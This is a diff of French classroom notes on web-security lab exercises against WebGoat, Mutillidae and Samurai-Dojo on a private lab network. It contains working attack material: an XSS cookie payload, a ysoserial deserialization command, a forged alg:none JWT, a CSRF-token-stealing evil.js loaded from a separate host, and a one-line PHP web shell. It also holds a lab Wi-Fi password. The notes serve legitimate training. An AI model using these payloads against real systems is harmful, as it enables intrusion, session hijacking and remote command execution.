@@ -1,44 +1,72 @@
 #<center>Cyber-Sécurité</center>
 
-## Tips
 
-!!! Ajout de plugins
-    Dans Extender il est aisément possible d'ajouter des plugins,  
-    Notamment le Déserialiser utile pour le TP #deserialization
-
-##Mise en jambes
+## Quand mettre en place de la sécurité?
 Faites de l'analyse de risque pour déterminer si on fait de la sécurité
 
 Qu'est ce qu'une donnée sensible?
 Une adresse mail c'est pas forcement sensible
 Il faut se référer au GDPR
 
-Les num de carte doivent être sécurisés en toutes circonstances
+Les numéros de carte doivent être sécurisés en toutes circonstances
 
-**Pas de sur-sécurité**
+**Pas de sur-sécurité**, dépense excessivement inutile
 
 On peut créer des analyses statiques qui vont étudier le code pour examiner les infos en dur dans le logiciel, les librairies, les fonctions etc.
 
 https://networkmarketshare.com
 
-Connexion à: ProxiaAP
-mdp: abcdef1234
 
-http://192.168.0.1:8081/WebGoat/attack
+## Types d'attaque
 
-Ajouter plug in pour passer par un proxy
+### Attaques XSS
 
-Télécharger Burpsuite
+XSS: Cross Site Scripting
+
+**XSS stocké**: je vais sur une page web, je post une attaque, a chaque fois que quelqu'un lit mon message attaque
+
+**XSS réfléchie**: Je fais un url avec mon attaque et je le partage, tout le monde a accès a mon attaque
+
+**XSS en dôme**: On injecte quelque chose dans le dôme HTML
+
+### Attaques SQL
+**Injection SQL numeric**: Quand le champs que je saisi est numérique, donc je ne joue pas avec les cotes
+
+**Injection SQL String**: je dois jouer avec les cotes, attention sql ajoute une cote au début et a la fin
+
+**Injection SQL Blind**: quand j'ai pas la possibilité d'avoir un retour direct de mon attaque. Je dois trouver un moyen d'avoir un information sur la réussite de mon attaque
+
+### Attaque XXE
+
+XXE: e**X**ternal **X**ML **E**ntity
+
+On vole des données sécurisées en utilisant des failles de configuration dans un parseur XML. On peut attaquer en direct, ou en utilisant un fichier *.dtd*.
+
+
+### Attaque CSRF
+
+**C**ross **S**ite **R**equest **F**orgery
+
+Mon objectif est de profité de sa connexion sur le serveur web d'administration pour prendre le contrôle.
+
+Problème il existe des Anti-CSRF Token, chaque fois que le browser accède a la page il récupère un token. Si le site veut re-communiquer avec le serveur il doit re-présenter ce token.  
+Si je suis capable de récupérer ce token, je passe pour une requête légitime
+
+
+### Attaque par Déserialisation
+
+On récupère les informations de fragilité de sérialisation avec le Deserializer Scanner. On ajoute notre attaque sérialisé dans un token a fournir, lors de la déserialisation ce token va attaquer le système.
+
+### Attaque par Contrôle d’accès
+
+On cherche des erreurs de contrôle d’accès, d'élévation de privilège et de gestion de privilèges. On peut accéder a des fichiers sensibles mal protégés, modifier des profils, etc. .
+
 
 ##Modes
 
-*Exemple*: 
-Original URL: `/search.php?cat_id=§123§&q=§hello§`
-Payload: 
-
 ###Sniper
 
-Si j'ai défini plusieurs paramètres, ils vont prendre a tour de rôle les valeurs possibles définis.
+Les paramètres, ils vont prendre a tour de rôle les valeurs possibles définis.
 
 ###Battering ram
 
@@ -56,8 +84,37 @@ Si on a 2 paramètres j'ai 2 listes en faisant toutes les combinaisons.
 
 ## TP
 
+Liens des outils:
+
+  - http://192.168.0.1:8081/WebGoat/attack
+  - http://192.168.0.1:8080/WebGoat/attack
+  - http://192.168.0.1:9090/WebWolf/login
+
+
+
+Connexion à: ProxiaAP
+mdp: abcdef1234
+
+http://192.168.0.1:8081/WebGoat/attack
+
+Ajouter plug in pour passer par un proxy
+
+Télécharger Burpsuite
+
 ### Mise en place
-Accéder au Hot-spot Wi-Fi ProxiaAP.
+
+Liens des outils:
+
+  - http://192.168.0.1:8081/WebGoat/attack
+  - http://192.168.0.1:8080/WebGoat/attack
+  - http://192.168.0.1:9090/WebWolf/login
+
+Accéder au Hot-spot Wi-Fi ProxiaAP:
+
+  - Connexion à: ProxiaAP
+  - mdp: abcdef1234  
+
+
 Configurer un proxy (FoxyProxy)
 Dans BurpSuite configurer le proxy et setter l'*Intercerpt is off*
 
@@ -67,7 +124,7 @@ et renseigner webgoat et webgoat pour les username et mdp.
 !!! tip
     Pour enlever les requettes non souhaitées dans Burp il faut clic droit sur une requête a garder, add to scope, puis clic sur filter, show only in-scope...
 
-###Cross-Site Scripting
+###XSS
 
 Une fois renseigner le mdp qui est le prénom de l'employé on peut accéder a la barre de recherche.
 Dans cette barre de recherche on y rentre un script: `<script>alert(document.cookie);</script>`
@@ -184,9 +241,9 @@ On défini les 2 paramètres, on choisi cluster bomb. On défini le premier en n
 On lance l'attaque !!
 
 
-#### XXE
+### XXE
 
-##### Attaque en direct
+#### Attaque en direct
 
 On souhaites exploiter des erreurs de paramétrage dans les parseurs XML.
 Pour se faire on intercepte la requête et on change la partie XML en ce qui suit.
@@ -222,7 +279,7 @@ Le script suivant permet quant à lui d'exfiltrer ces données en créant une va
     Sur le site la requête a été exécutée  
     
 
-##### Attaque a l'aide d'un fichier
+#### Attaque a l'aide d'un fichier
 
 On upload le fichier attack.dtd via WebWolf.  
 
@@ -244,7 +301,7 @@ Ici on va cherche le fichier attack.dtd et on viens afficher son contenu
 </comment>
 ```
 
-##### Mulillidae
+#### Mulillidae
 
 L'outil du TP: [Mulillidae](http://192.168.0.1/mutillidae/index.php?page=xml-validator.php)  
 On souhaite a présent extraire les données vers un site externe.
@@ -288,6 +345,16 @@ Script renseigné
 
 ### Access Control Flaws
 
+#### Déserialization 
+
+`java -Dhibernate5 -jar ysoserial-0.0.6-SNAPSHOT-all.jar Hibernate1 "touch /tmp/proxia1" | base64 -w0 > webgoat_payload1_touch.txt`
+
+On ouvre un shell dans le dossier LabWebSecu
+
+Ça créer un fichier txt, la ou on est
+
+On copie ce qu'il y a dans le txt dans le site
+
 #### Bypass a Path Based Access Control Scheme
 
 Dans cette partie on cherche a trouver des erreurs de contrôle d’accès, d'élévation de privilège et de gestion de privilèges.
@@ -319,12 +386,127 @@ Upgrade-Insecure-Requests: 1
 action=DeleteStaff
 ```
 
-#### Déserialization 
+##### Stage 3: Bypass Data Layer Access Control
 
-`java -Dhibernate5 -jar ysoserial-0.0.6-SNAPSHOT-all.jar Hibernate1 "touch /tmp/proxia1" | base64 -w0 > webgoat_payload1_touch.txt`
+Je me connecte en tant que Tom
+J'intercept avec Burp la requête *View Profile*
+On modifie dans la requête, on forward et on peut voir le salaire du manager de Tom.
 
-On ouvre un shell dans le dossier LabWebSecu
+!!! Tips
+    Dans la page de login, on peut trouver dans le code HTML les id des employés, on peut donc directement cibler un employé.
 
-Ça créer un fichier txt, la ou on est
 
-On copie ce qu'il y a dans le txt dans le site
+
+### Session Management Flaws
+
+#### Spoof an Authentication Cookie
+
+Outil de transformation de String: https://yehg.net/encoding/pce-cached.php
+
+On cherche un faille dans l'authentification.
+
+Premièrement on essaye de se connecter en webgoat/webgoat pour voir ce qu'il se passe.
+*Je n'ai rien remarqué dans la requête envoyée. On voit que lorsque la connexion est réussi on affiche "Your identity has been remembered"*.
+
+On remarque que après avoir été identifié on reçoit une requête GET avec un cookie d'authentification. Si on fait reverse et char--. On trouve que le cookie `65432udfqtb` se transforme en `aspect12345`. Si on change aspect par Alice et on refait les étapes char++ puis reverse alors on obtient le cookie d’authentification d'Alice.
+
+#### Hijack a Session
+
+On identifie que a chaque requête le serveur nous renvoi un nouvel identifiant. Je vais donc chercher une logique dans la génération des session id. J'utilise de **Sequencer** dans BURP en ayant enlever le cookie dans la requête.
+On analyse les token, on voit que seul les 3, 4 16, 17 et 18 ème nombre du token changent régulièrement.
+
+On en déduit en regardant l'évolution qu'un token ne nous a pas été attribué, donc quelqu'un a obtenu ce token et s'est connecté. Reste plus qu'a deviné le token. Si on a besoin de faire varier quelque chose on peut toujours utiliser l'intruder pour essayer quelques valeurs.
+
+
+### Authentication Flaws
+
+#### JWT token
+
+##### JWT signing
+
+Outil pour encoder des JWT: https://jwt.io/
+
+On se met en tant que Tom, on essaye de supprimer les votes, dans la requête intercepté on récupère le acces-token. On décode ce token en base64:
+`{"alg":"HS512"}.{"iat":1604393476,"admin":"false","user":"Tom}`  
+On le modifie en `{"alg":"none"}.{"iat":1604393476,"admin":"true","user":"Tom"}`  
+On ré-encode les 2 partie de part et d'autre du point en base64: `eyJhbGciOiJub25lIn0=.eyJpYXQiOjE2MDQzOTM0NzYsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ==.`
+
+
+
+### CSRF
+
+#### Samurai-Dojo Basic
+
+Samurai-Dojo Basic: http://192.168.0.1:8082
+
+On veut pouvoir poster un commentaire dans le blog
+
+On doit trouver une attaque XSS dans le dôme et vérifier le fonctionnement du token anti-CSRF.
+
+On voit qu'on a accès a beaucoup d'infos dans *Browser Info*.
+
+Si on intercepte quand on fait *Browser Info*, on peut modifier le Host, on met: `<script> alert('hack')</script>`.  
+On remarque que le script est exécuté.
+
+Si on intercepte la requête d'un *Blog Entry*, on trouve un `xsrf_token`. 
+
+Injection dans le dôme: *BrowserInfo* -> On prend le *Referee* (par exemple), on le remplace par mon script d'attaque
+
+On remarque qu'il n'y a pas de gestion des paramètres mis dans l'URL et que si on met un # a la place du & avant notre script il n’apparaît pas du côté serveur.
+
+evil.js: http://192.168.0.1:81/evil.js
+```js
+var myxhrGET = new XMLHttpRequest();
+var myuriGET = 'http://192.168.0.1:8082/index.php?page=add-to-your-blog.php&done=byxss'
+myxhrGET.onreadystatechange = function() {
+    if (myxhrGET.readyState == XMLHttpRequest.DONE) {
+        var myresponse = myxhrGET.response;
+        var mytoken = myresponse.getElementsByName("xsrf_token")[0].value;
+        do_xsrf(mytoken);
+    }
+}
+myxhrGET.open('GET', myuriGET, true);
+myxhrGET.responseType = "document";
+myxhrGET.send(null);
+function do_xsrf(mytoken){
+    var myxhrPOST = new XMLHttpRequest();
+    myuriPOST = 'http://192.168.0.1:8082/index.php?page=add-to-your-blog.php&done=byxsrf';
+    myxhrPOST.open('POST',myuriPOST,true);
+    mypayload = 'input=ISEN4EVER&Submit_button=Submit&xsrf_token='+mytoken;
+    myxhrPOST.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+    myxhrPOST.setRequestHeader('Content-length',mypayload.length);
+    myxhrPOST.setRequestHeader('Connection', 'close');
+    myxhrPOST.onreadystatechange = function(){
+    }
+    myxhrPOST.send(mypayload);
+    alert("Success...!");
+}
+```
+
+`<script src ="http://192.168.0.1:81/evil.js"></script>` permet d'exécuter
+
+`http://192.168.0.1:81/index.php?page=browser-info.php#<script src ="http://192.168.0.1:81/evil.js"></script>` permet de faire exécuter la commande a distance.
+
+<?php passthru($_GET['cmd']); ?>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+## Tips
+
+
+!!! Plugins
+    Dans l'Extender de BURP il est aisément possible d'ajouter des plugins,  
+    Notamment le Déserialisation utile pour le TP #deserialization
